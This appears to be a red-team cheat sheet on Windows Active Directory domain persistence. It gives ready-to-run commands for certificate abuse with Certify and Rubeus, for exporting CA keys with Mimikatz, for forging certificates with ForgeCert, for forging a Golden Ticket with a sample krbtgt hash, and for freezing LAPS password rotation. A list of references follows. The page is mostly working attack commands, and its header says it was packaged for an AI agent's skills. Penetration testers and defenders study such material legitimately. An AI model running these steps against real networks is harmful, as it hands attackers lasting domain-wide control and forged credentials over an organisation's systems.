<!-- provenance: InternalAllTheThings docs/redteam/persistence/windows-persistence.md @ 203bb0c | part 3/3: Windows Persistence - Domain | converted for Agent Skills; see ../../NOTICE.md -->

# Windows Persistence - Domain

## Domain

### User Certificate

```ps1
# Request a certificate for the User template
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User

# Convert the certificate for Rubeus
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request a TGT using the certificate
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```

### Golden Certificate

> Require elevated privileges in the Active Directory, or on the ADCS machine

* Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`
* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER

    ```ps1
    privilege::debug
    crypto::capi
    crypto::cng
    crypto::certificates /systemstore:local_machine /store:my /export
    ```

* Alternative 2: Using SharpDPAPI, then convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
* [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user using the CA certificate

    ```ps1
    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
    ```

* Finally you can request a TGT using the Certificate

    ```ps1
    Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
    ```

### Golden Ticket

> Forge a Golden ticket using Mimikatz

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

### LAPS Persistence

To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.

```ps1
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

## References

* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - wunderwuzzi - September 23, 2020](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
* [Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals - Michael Weber - January 26, 2026](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/)
* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
* [Hijack the TypeLib. New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
* [IIS Raid – Backdooring IIS Using Native Modules - February 19, 2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa - April 27, 2020](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
* [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
* [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - February 27, 2023](https://0xv1n.github.io/posts/scmanager/)
* [Sc sdset - Microsoft - August 31, 2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins - September 8, 2019](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
